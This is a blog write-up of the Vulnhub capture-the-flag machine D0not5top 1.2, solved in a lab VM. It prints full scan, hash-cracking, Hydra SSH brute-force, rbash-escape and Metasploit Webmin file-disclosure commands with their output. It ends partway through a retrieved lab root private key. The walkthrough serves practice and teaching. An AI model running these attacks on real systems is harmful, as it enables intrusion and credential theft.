---
layout:     post
title:      "Vulnhub.com - D0not5top 1.2"
subtitle:   "Write-Up"
date:       2017-06-10 2:00:00
author:     "W3ndige"
header-img: "img/d0not5top-header.jpg"
permalink: /:title/
category: Vulnhub
---

<h1>Introduction</h1>

<p>Today we're going to play with another machine from <a href="">Vulnhub</a> called <a href="https://www.vulnhub.com/entry/d0not5top-12,191/">D0not5top</a>. Our aim is to find all 7 flags, and root the box. It seems to be a little harder then the previous ones, but all we want is a good challenge, right? </p>

<h1>Write-Up</h1>

<p>As we know that IP addess of this machine is <b>10.0.2.8</b>, we can start by enumerating the machine for any open ports. </p>

{% highlight bash %}
root@kali:~# nmap -v -p- -sS -A -T4 10.0.2.8

Starting Nmap 7.01 ( https://nmap.org ) at 2017-06-08 13:32 EDT
NSE: Loaded 132 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Initiating ARP Ping Scan at 13:32
Scanning 10.0.2.8 [1 port]
Completed ARP Ping Scan at 13:32, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:32
Completed Parallel DNS resolution of 1 host. at 13:32, 6.52s elapsed
Initiating SYN Stealth Scan at 13:32
Scanning 10.0.2.8 [65535 ports]
Discovered open port 53/tcp on 10.0.2.8
Discovered open port 80/tcp on 10.0.2.8
Discovered open port 22/tcp on 10.0.2.8
Discovered open port 111/tcp on 10.0.2.8
Discovered open port 25/tcp on 10.0.2.8
Discovered open port 59418/tcp on 10.0.2.8
Completed SYN Stealth Scan at 13:32, 3.47s elapsed (65535 total ports)
Initiating Service scan at 13:32
Scanning 6 services on 10.0.2.8
Completed Service scan at 13:32, 13.56s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 10.0.2.8
NSE: Script scanning 10.0.2.8.
Initiating NSE at 13:32
Completed NSE at 13:32, 8.77s elapsed
Initiating NSE at 13:32
Completed NSE at 13:32, 0.01s elapsed
Nmap scan report for 10.0.2.8
Host is up (0.00070s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 a7:52:df:39:80:7c:66:16:2f:fd:f7:7b:80:13:09:85 (DSA)
|   2048 bf:d9:5a:22:54:91:cc:36:40:3c:e6:35:4f:8e:0c:78 (RSA)
|_  256 16:e6:84:e1:5f:80:bc:27:6a:50:01:55:f0:c0:cc:72 (ECDSA)
25/tcp    open  smtp    Exim smtpd
| smtp-commands: D0Not5top Hello nmap.scanme.org [10.0.2.15], SIZE 52428800, 8BITMIME, PIPELINING, HELP,
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
53/tcp    open  domain  PowerDNS 3.4.1
| dns-nsid:
|   NSID: D0Not5top (44304e6f7435746f70)
|   id.server: D0Not5top
|_  bind.version: PowerDNS Authoritative Server 3.4.1 (jenkins@autotest.powerdns.com built 20170111224403 root@x86-csail-01.debian.org)
80/tcp    open  http    Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 22 disallowed entries (15 shown)
| /games /dropbox /contact /blog/wp-login.php
| /blog/wp-admin /search /support/search.php
| /extend/plugins/search.php /plugins/search.php /extend/themes/search.php
|_/themes/search.php /support/rss /archive/ /wp-admin/ /wp-content/
|_http-server-header: Apache
|_http-title: Site doesnt have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36778/udp  status
|_  100024  1          59418/tcp  status
59418/tcp open  status  1 (RPC #100024)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36778/udp  status
|_  100024  1          59418/tcp  status
MAC Address: 08:00:27:58:A4:C4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Uptime guess: 198.048 days (since Tue Nov 22 11:23:13 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 10.0.2.8

NSE: Script Post-scanning.
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.93 seconds
            Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
{% endhighlight %}

<p>Great, we have found a lot of information about the machine. I'll leave the <b>ssh</b>, as we don't have much information to start from, but <b>smtp</b> seems to be a good choice. </p>

<h1>SMTP</h1>

<p>Let's try and connect to it, maybe we'll be lucky to find some clues. </p>

{% highlight bash %}
root@kali:~# nc 10.0.2.8 25
220 46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434 717070756 5793437 347 3767879610a EXIM SMTP
{% endhighlight %}

<p>A string in hexadecimal format? We can try to decode it using xxd tool. Option <b>-ps</b> will make our output in plain hexdump style. </p>

{% highlight bash %}
root@kali:~# echo "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434 717070756 5793437 347 3767879610a" | xxd -r -ps
FL46_3:29dryf67uheht2r1dd4qppuey474svxya
{% endhighlight %}

<p>Third flag already! But where are the first two?  </p>

<h1>HTTP</h1>

<p>In order to move on with this attack I decided to take a look at the website, hosted at port 80. </p>

![First Look](/img/d0not5top/website-1.png){:class="img-responsive center-block"}

<p>But there was nothing here, both in the source code and in the page itself. In order to try and find anything more, I decided to deploy an <b>Nikto</b> scan. </p>

{% highlight bash %}
root@kali:~# nikto -h 10.0.2.8
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.8
+ Target Hostname:    10.0.2.8
+ Target Port:        80
+ Start Time:         2017-06-08 13:36:47 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ Server leaks inodes via ETags, header found with file /, fields: 0xd3 0x54c550ee22d56
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /games/: Directory indexing found.
+ Entry '/games/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/dropbox/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/contact/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/search/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/archive/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/wp-content/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/wp-includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/comment-page-/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/trackback/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (301)
+ Entry '/blackhole/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/mint/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/feed/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 26 entries which should be manually viewed.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ OSVDB-3092: /archive/: This might be interesting...
+ OSVDB-3092: /support/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-admin/: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7563 requests: 0 error(s) and 28 item(s) reported on remote host
+ End Time:           2017-06-08 13:37:05 (GMT-4) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

<p>Wordpress website? Unfortunately not, it was false alarm, as they were only blank pages. Let's hope that <b>robots.txt</b> will tell us something more about this site.   </p>

{% highlight text %}
User-agent: *
Disallow: /games
Disallow: /dropbox
Disallow: /contact
Disallow: /blog/wp-login.php
Disallow: /blog/wp-admin
Disallow: /search
Disallow: /support/search.php
Disallow: /extend/plugins/search.php
Disallow: /plugins/search.php
Disallow: /extend/themes/search.php
Disallow: /themes/search.php
Disallow: /support/rss
Disallow: /archive/
Disallow: /wp-admin/
Disallow: /wp-content/
Disallow: /wp-includes/
Disallow: /comment-page-
Disallow: /trackback/
Disallow: /xmlrpc.php
Disallow: /blackhole/
Disallow: /mint/
Disallow: /feed/
Allow: /tag/mint/
Allow: /tag/feed/
Allow: /wp-content/images/
Allow: /wp-content/online/

# terminal knows where to go.
User-agent: GameTerminal
Disallow:
{% endhighlight %}

<p>Bad luck, after manually checking each entry all of them were, once again, blank pages. Even <b>phpmyadmin</b> website, that I came around, didn't help me.  </p>

![phpmyadmin](/img/d0not5top/phpmyadmin.png){:class="img-responsive center-block"}

<p>Desperatly looking for something more I decided to run a <b>dirb</b> scan, in hope to find something.  </p>

{% highlight bash %}
root@kali:~# dirb http://10.0.2.8

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Jun  8 13:43:39 2017
URL_BASE: http://10.0.2.8/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.0.2.8/ ----
==> DIRECTORY: http://10.0.2.8/archive/
==> DIRECTORY: http://10.0.2.8/blog/
==> DIRECTORY: http://10.0.2.8/contact/
==> DIRECTORY: http://10.0.2.8/control/
==> DIRECTORY: http://10.0.2.8/feed/
==> DIRECTORY: http://10.0.2.8/games/
+ http://10.0.2.8/index.html (CODE:200|SIZE:211)
==> DIRECTORY: http://10.0.2.8/manual/
==> DIRECTORY: http://10.0.2.8/mint/
==> DIRECTORY: http://10.0.2.8/phpmyadmin/
==> DIRECTORY: http://10.0.2.8/plugins/
+ http://10.0.2.8/robots.txt (CODE:200|SIZE:695)
==> DIRECTORY: http://10.0.2.8/search/
+ http://10.0.2.8/server-status (CODE:403|SIZE:222)
==> DIRECTORY: http://10.0.2.8/support/
==> DIRECTORY: http://10.0.2.8/tag/
==> DIRECTORY: http://10.0.2.8/themes/
==> DIRECTORY: http://10.0.2.8/trackback/
==> DIRECTORY: http://10.0.2.8/wp-admin/
==> DIRECTORY: http://10.0.2.8/wp-content/
==> DIRECTORY: http://10.0.2.8/wp-includes/
==> DIRECTORY: http://10.0.2.8/xmlrpc.php/
{% endhighlight %}

<h1>Control</h1>

<p>That's only a part of the entry, but I've found that there are more results such as <b>control</b> or <b>server-status</b> page. Let's look at them, firstly the control page. </p>

![control](/img/d0not5top/control.png){:class="img-responsive center-block"}

<p>None of the functions seemed to work so I decided to look at the source code. And here it is, the first flag! </p>

{% highlight html %}
  <div id="wrapper">

    <!-- FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w -->
    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
        <div class="navbar-header">
            <a class="navbar-brand" href="#">Startmin</a>
        </div>
{% endhighlight %}

<p>Now, I think we're on the right track. Another clue was hidden, scrooling downwards.  </p>

{% highlight html %}
<div class="row">
    <div class="col-lg-12">
      <h1 class="page-header">DNS Control Panel</h1>
      </div>
    </div>
  <div class="fluid-ratio-resize"></div>
  <!-- M3gusta said he hasn't had time to get this w0rKING.
  Don't think he's quite in the 20n3 these days since his MadBro made that 7r4n5f3r, Just Couldnt H@cxk Da D0Not5topMe.ctf --!>

{% endhighlight %}

<p>As I've tried to look in every directory possible, I've found that in the <b>/control/js</b> folder was the file called <b>README.MadBro</b>. What's that?</p>

{% highlight html %}

  ###########################################################
  # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
  # M4K3 5UR3 2 S3TUP Y0UR /3TC/H05T5 N3XT T1M3 L0053R...   #
  # 1T'5 D0Not5topMe.ctf !!!!                               #
  # 1M 00T4 H33R..                                          #
  # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
  ###########################################################

                  FL101110_10:111101011101
                  1r101010q10svdfsxk1001i1
                  11ry100f10srtr1100010h10                
{% endhighlight %}

<p>Flag in binary? Let's decode it. </p>

{% highlight text %}
FL46_2:39331r42q2svdfsxk9i13ry4f2srtr98h2
{% endhighlight %}

<p>Now let's come back to the clue. We have to setup <b>/etc/hosts</b>? In the left column of the file is IP address of our machine, and in the right the domain name.</p>

{% highlight text %}
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.8       D0Not5topMe.ctf


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endhighlight %}

<p>And we are ready to reset the network interface, and access the site. </p>

<h1>D0Not5topMe.ctf</h1>

![forum](/img/d0not5top/forum.png){:class="img-responsive center-block"}

<p><b>PhpBB</b> forum. The message in the homepage seems to be <b>pig latin</b>. After simple translation, we got the message. </p>

{% highlight bash %}
emay ayingplay uchmay amesgay ownay egistrarioray arnay edsay emay emailway ayay egustomay otay indfay away eomay ideyhohay
me playing much games now registrario rna sed me wemail a megusto to find wa meo hideyho
{% endhighlight %}

<p>Okay, so we have to register. I tried doing it with different accounts, playing with options ,but none of them seemed to lead me to the solution. After a while, I found that after not agreeing with terms, website will send a <b>POST</b> request, with some fancy paramteres. </p>

![donotagree](/img/d0not5top/donotagree.png){:class="img-responsive center-block"}

<p>See this string <b>FLaR6yF1nD3rZ_html</b>? Let's jump to that. </p>

{% highlight brainfuck %}
+++++ +++[- >++++ ++++< ]>+++ +++.+ +++++ .<+++ +[->- ---<] >---- ----.
++.<+ +++++ [->++ ++++< ]>+++ ++.<+ +++++ [->-- ----< ]>--- ----. +++++
+.<++ +++++ [->++ +++++ <]>++ +.<++ +++++ [->-- ----- <]>-- ----- -----
-.++. <++++ ++[-> +++++ +<]>+ +++++ +++++ +.<++ ++[-> ++++< ]>+++ +.<++
+++++ +[->- ----- --<]> ----- .<+++ +++++ [->++ +++++ +<]>+ .++++ ++.<+
+++++ ++[-> ----- ---<] >---. <++++ +++[- >++++ +++<] >++++ +++++ ++++.
<+++[ ->--- <]>-- ---.< +++++ ++[-> ----- --<]> .+.+. ----- -.+++ +++++
+.-.- ---.< +++++ ++[-> +++++ ++<]> ..-.- .++++ +.++. +++++ ++++. <++++
+++[- >---- ---<] >---- ----- --.-- ---.< +++++ ++[-> +++++ ++<]> +++++
.<+++ [->++ +<]>+ +.++. --.++ .<+++ ++++[ ->--- ----< ]>--- ----- ---.<
{% endhighlight %}

<p>Looks like <b>brainfuck</b>. After compiling it, we got another flag! </p>

{% highlight text %}
FL46_4:n02bv1rx5se4560984eedchjs72hsusu9
{% endhighlight %}

<p>Still, it didn't lead me anywhere near the end. At this time, I decided to take a look at possible SQL injections where I've found something interesting. Changing the URL, resulted in showing an error message. </p>

{% highlight html %}
http://d0not5topme.ctf/ucp.php?sid=f22e8d906dbe2b481bb7f30522b7e7a0&i=hithere
{% endhighlight %}

<p>Together with this message was the e-mail address. Will it be another domain to enter in <b>/etc/hosts</b>? </p>

![error](/img/d0not5top/error.png){:class="img-responsive center-block"}

<p>Let's try that. </p>

{% highlight text %}
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.8        D0Not5topMe.ctf
10.0.2.8        G4M35.ctf
{% endhighlight %}

<p>And now we can direct our browser to that site. </p>

<h1>G4M35.ctf</h1>

![game](/img/d0not5top/game.png){:class="img-responsive center-block"}

<p>It's a game and it's pretty good one. Or maybe it's my lack of games, who really knows... Anyway, it was fun little break, but after losing I got another hint. </p>

![death](/img/d0not5top/death.png){:class="img-responsive center-block"}

<p>Another directory and another game, awesome!</p>

![game-2](/img/d0not5top/game-2.png){:class="img-responsive center-block"}

<p>After playing for a while, I noticed a strange texture in the background. </p>

![texture](/img/d0not5top/texture.png){:class="img-responsive center-block"}

<p>Typing it down got us another flag! </p>

{% highlight text %}
\106\114\64\66\137\65\72\60\71\153\70\67\150\66\147\64\145\62\65\147\150\64\64\167\141\61\162\171\142\171\146\151\70\71\70\150\156\143\144\165
FL46_5:09K87H6G4E25GH44WA1RYBYFI898HNCDU
{% endhighlight %}

<p>Two more to go! After playing a bit more, and finishing it, I got another domain to add -  this time <b>t3rm1n4l.ctf</b>. We can once again add this to <b>/etc/hosts</b>. </p>

<h1>T3rm1n4l.ctf</h1>

![terminal](/img/d0not5top/terminal.png){:class="img-responsive center-block"}

<p>It's a terminal, but what's the password? Luckily, after some tries, I typed <b>t3rm1n4l.ctf</b> and it works! </p>

{% highlight bash %}
t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
pwd
/usr/share/nginx/html
dir
t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
dir
ERROR: Megusto ere no no!
id
t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
grep *
t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
grep *
grep: BBBBBBBBBBB: Is a directory
grep: CCCCCCCCCCC: Is a directory
grep: M36u574.ctf: Is a directory
grep: XXXXXXXXXXX: Is a directory
grep: YYYYYYYYYYY: Is a directory
grep: ZZZZZZZZZZZ: Is a directory
{% endhighlight %}

<p>And another long journey through typing different commands. I've found that <b>grep</b> command works, and now we have another domain to collect. </p>

{% highlight text %}
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.8        D0Not5topMe.ctf
10.0.2.8        G4M35.ctf
10.0.2.8        t3rm1n4l.ctf
10.0.2.8        M36u574.ctf
{% endhighlight %}

<h1>M36u574.ctf</h1>

<p>This page was... It was a slideshow of different megusta memes. As nothing was in the source code, I decided to take a look at the images - maybe they are hiding something. </p>

![kingmegusta](/img/d0not5top/kingmegusta.jpg){:class="img-responsive center-block"}

<p>Yeah, this image, I knew it was hiding something! </p>

{% highlight bash %}
root@kali:~/Documents# exiftool kingmegusta.jpg
MeGustaKing:$6$e1.2NcUo$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRNPxQnydsLzQGvYOU84B2nY/O40pZ30
{% endhighlight %}

<p>Username and password pair, now we only have to crack it. <b>JohnTheRipper</b> should be ablo to do it without any problems. </p>

{% highlight bash %}
root@kali:~/Documents# john --wordlist:/usr/share/wordlists/rockyou.txt pass
Created directory: /root/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (?)
1g 0:00:00:38 DONE (2017-06-09 06:51) 0.02625g/s 574.6p/s 574.6c/s 574.6C/s 101207..shayneward
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

<h1>SSH</h1>

<p>This is the password? Really? Moving on, we should be able to login to <b>ssh</b> using these credentials. </p>

{% highlight bash %}
root@kali:~/Documents# ssh MeGustaKing@10.0.2.8
The authenticity of host '10.0.2.8 (10.0.2.8)' can't be established.
ECDSA key fingerprint is SHA256:mAxp6psDamyOxr81/mYUZPkIk2s+EDdyz1+RkRFLSUM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.2.8' (ECDSA) to the list of known hosts.
MeGustaKing@10.0.2.8's password:
ERROR!
TRACE: sshPr0xy.py line:550 <CODE>U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==</CODE>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
Welcome to rush shell
Lets you update your FunNotes and more!

Uh0h.. u n0 burtieo
h35 da 54wltyD4w6 y0u...
Gw04w4y :(
Local configuration error occurred.
Contact the systems administrator for further assistance.
Connection to 10.0.2.8 closed.
{% endhighlight %}
<p>Unfortunately, we didn't have a chance to type commands but we got this base64 encrypted string. </p>

{% highlight bash %}
root@kali:~/Documents# echo "U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5
> sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==" | base64 -d
Salted__�y8j���Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK���i�88$&
root@kali:~/Documents# echo "Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK" | base64 -d
FL46_6:pqpd2jfn4ruq1obyv3thw848te67tejey
{% endhighlight %}

<p>One more to go! But after looking even more at the <b>ssh</b> connection I found that this string may be a clue - <b>Uh0h.. u n0 burtieo</b>. Is this username? If yes, we can try to crack it using <b>hydra</b> and <b>rockyou.txt</b> wordlist.  </p>

{% highlight bash %}
root@kali:~/Documents# hydra -l burtieo -P /usr/share/wordlists/rockyou.txt 10.0.2.8 ssh
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-06-09 06:57:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
[DATA] attacking service ssh on port 22
[STATUS] 160.00 tries/min, 160 tries in 00:01h, 14344239 todo in 1494:12h, 16 active
[STATUS] 117.33 tries/min, 352 tries in 00:03h, 14344047 todo in 2037:31h, 16 active
[STATUS] 96.25 tries/min, 18384 tries in 03:11h, 14326015 todo in 2480:40h, 16 active
[STATUS] 96.23 tries/min, 19920 tries in 03:27h, 14324479 todo in 2480:54h, 16 active
[STATUS] 96.22 tries/min, 21456 tries in 03:43h, 14322943 todo in 2481:04h, 16 active
[STATUS] 96.20 tries/min, 22992 tries in 03:59h, 14321407 todo in 2481:10h, 16 active
[ssh] host: 192.168.190.132 login: burtieo password: Lets you update your FunNotes and more!
{% endhighlight %}

<p>Another troll :/ Let's log in once more using these credentials. </p>

{% highlight bash %}
W2wC0m3 Bw3rtie0 :)
burtieo@D0Not5top:~$ ls
-rbash: ls: command not found
burtieo@D0Not5top:~$ pwd
/home/burtie
burtieo@D0Not5top:~$ id
-rbash: id: command not found
burtieo@D0Not5top:~$ cat
-rbash: cat: command not found
{% endhighlight %}

<p>It's an <b>rbash</b>, and I'm not able to run mostly  any of the commands. After huge amount of trying different methods, enumerating, trying to break from the rbash, I gave up and with a little help found this command. </p>

{% highlight bash %}
burtieo@D0Not5top:~$ echo $(suedoh -l)
suedoh: unable to resolve host D0Not5top
Matching Defaults entries for burtieo on D0Not5top: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User burtieo may run the following commands on D0Not5top: (ALL) NOPASSWD: /usr/bin/wmstrt
burtieo@D0Not5top:~$ suedoh /usr/bin/wmstrt
    D1dyaCatchaT3nK1l0?
    :D
{% endhighlight %}

<p>Running <b>suedoh /usr/bin/wmstrt</b> opens another port, which we checked using <b>Nmap</b>.  </p>

{% highlight bash %}
root@kali:~# nmap 10.0.2.8

Starting Nmap 7.01 ( https://nmap.org ) at 2017-06-09 14:15 EDT
Nmap scan report for D0Not5topMe.ctf (10.0.2.8)
Host is up (0.00026s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
10000/tcp open  snet-sensor-mgmt
MAC Address: 08:00:27:58:A4:C4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
{% endhighlight %}

<p>As it's open only for certain amount of time, I decided to run a simple loop, that will keep this port open. </p>

{% highlight bash %}
burtieo@D0Not5top:~$ for i in {1..99999..1};do echo $(suedoh /usr/bin/wmstrt&);done
suedoh: unable to resolve host D0Not5top
{% endhighlight %}

<p>Now what is <b>snet-sensor-mgmt</b>? Googling that name gave us simple tip - it can be <b>webmin</b> instance. We can try to attack it using <b>metasploit</b>, but firstly, let's find an proper exploit. </p>

{% highlight text %}
root@kali:~# msfconsole

Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             http://metasploit.pro


Payload caught by AV? Fly under the radar with Dynamic Payloads in
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.7-                             ]
+ -- --=[ 1518 exploits - 877 auxiliary - 259 post        ]
+ -- --=[ 437 payloads - 38 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search webmin
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                         Disclosure Date  Rank       Description
   ----                                         ---------------  ----       -----------
   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     Webmin File Disclosure
   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution
{% endhighlight %}

<p>File disclosure? We can use it to get the content of <b>ssh keys</b>. </p>

{% highlight bash %}
msf > use auxiliary/admin/webmin/file_disclosure
msf auxiliary(file_disclosure) > show options

Module options (auxiliary/admin/webmin/file_disclosure):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   DIR      /unauthenticated  yes       Webmin directory path
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                      yes       The target address
   RPATH    /etc/passwd       yes       The file to download
   RPORT    10000             yes       The target port
   VHOST                      no        HTTP server virtual host


Auxiliary action:

   Name      Description
   ----      -----------
   Download


msf auxiliary(file_disclosure) > set RHOST 10.0.2.8
RHOST => 10.0.2.8
msf auxiliary(file_disclosure) > set SSL True
SSL => True
msf auxiliary(file_disclosure) > set RPATH /root/.ssh/id_rsa
RPATH => /root/.ssh/id_rsa
msf auxiliary(file_disclosure) > exploit

[*] Attempting to retrieve /root/.ssh/id_rsa...
[*] The server returned: 200 Document follows
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7DA162212961C0CF94C636B47C991024

rDnUjh68EoasdaP40ta9QBeXtvB5uUVH9nKHKWo4KvhLcM4Z0/R6qvjSjlHir4LR
uhTb5Y+e2C7Wze8GlYbdGksFXbUztZec26vN7xH8Q4SeI++J77agqKWRE6jJ++hd
DsR7vDcqGbm9xX37BbE9Q4lLEHR/hNRe3/Ztrbt3obnCLvCW6H3kzpteycWAQQ3W
BaFns85p4AZn654HoIqX/UOkztdYxgOLgpzrLh9p1bRLiaOiBCrURkpYLspeKCNN
yfuPvNUgF1+uH78GlvLwfAA6XRj6HPDZ3D22/MxKcGixUVSPXjJlRpqyFQtvSM6T
cN5NmXjOjmzfgafqPqf7eTFfLChcsWHUmsSneq7pQhvw/vfeGX2kizuXCago+yWt
2IlFusQilfDDzybiunNOp+njD7TxeBLFcAUVdACfMUQ/fC0GHKeHB8q79Wi7r0SQ
m0eC6fIXJpDavN9PtPF2v+5OH9EDKycaeWMmWT0S0fNMmIhHb+U/uhtDjQx+M9fI
I5aBCjzCsDCoKT0qkv+dTafyqSzUN9EupCRh0NcsUT00yrQkxzM5L6C3H+61SNq8
CNi4I50aDp8q6m0KP/GZhUAU9Uegj+JZQ1h5MSnjOpOvKbD4l6/rWM02iFVAmg4O
WjSQfqbxGCmoHE8Y7iqgB8lRWnDYPssDXIMx+1pBkNkBASMpz6gJBZ//rJE1PkVr
aKdhbJFR1NX097z3HXS/7SBJmyuctG+JviH7mp1fH3WMAk2iu4nSiE1aNH1YV/nW
rXNOi5c7/yDE9o/weuJoCBL4VXeH89+l8551JOGU9RMuNk0pi/SSaUwwn7wR0/Yf
b9Sk3pbFDS64AON1T+4zlBWWif8aRMJ7Vm6zkDsE1Jq9nKcNzDknfufs45mKVzXU
